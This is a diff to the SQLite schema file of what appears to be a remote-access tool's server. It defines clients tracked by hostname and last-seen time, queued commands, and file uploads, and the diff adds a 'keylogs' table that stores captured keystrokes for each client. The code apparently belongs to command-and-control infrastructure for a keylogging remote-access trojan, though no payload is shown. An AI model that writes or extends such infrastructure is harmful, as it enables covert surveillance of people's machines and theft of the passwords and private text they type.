@@ -1,6 +1,4 @@
 // language: JavaScript, file: db.js
-// node:sqlite. single source of truth for schema and file layout.
-
 import { DatabaseSync } from 'node:sqlite';
 import fs from 'node:fs';
 import path from 'node:path';
@@ -45,9 +43,8 @@ db.exec(`
     last_seen  INTEGER NOT NULL,
     FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
   );
-  CREATE INDEX IF NOT EXISTS idx_clients_user   ON clients(user_id);
-  CREATE INDEX IF NOT EXISTS idx_clients_host   ON clients(user_id, hostname);
-  CREATE INDEX IF NOT EXISTS idx_clients_live   ON clients(user_id, last_seen);
+  CREATE INDEX IF NOT EXISTS idx_clients_user ON clients(user_id);
+  CREATE INDEX IF NOT EXISTS idx_clients_host ON clients(user_id, hostname);
 
   CREATE TABLE IF NOT EXISTS commands (
     id         INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -76,9 +73,19 @@ db.exec(`
     FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
   );
   CREATE INDEX IF NOT EXISTS idx_uploads_client ON uploads(client_id, created_at);
+
+  CREATE TABLE IF NOT EXISTS keylogs (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id    INTEGER NOT NULL,
+    client_id  INTEGER NOT NULL,
+    data       TEXT NOT NULL,
+    created_at INTEGER NOT NULL,
+    FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
+    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
+  );
+  CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at);
 `);
 
-// migration: add login_token to existing installs
 try {
   const cols = db.prepare(`PRAGMA table_info(users)`).all();
   if (!cols.some(c => c.name === 'login_token')) {
@@ -87,7 +94,7 @@ try {
     console.log('[db] migrated: added login_token column');
   }
 } catch (e) {
-  console.error('[db] migration check failed:', e.message);
+  console.error('[db] migration:', e.message);
 }
 
 for (const f of [DB_PATH, DB_PATH + '-wal', DB_PATH + '-shm']) {
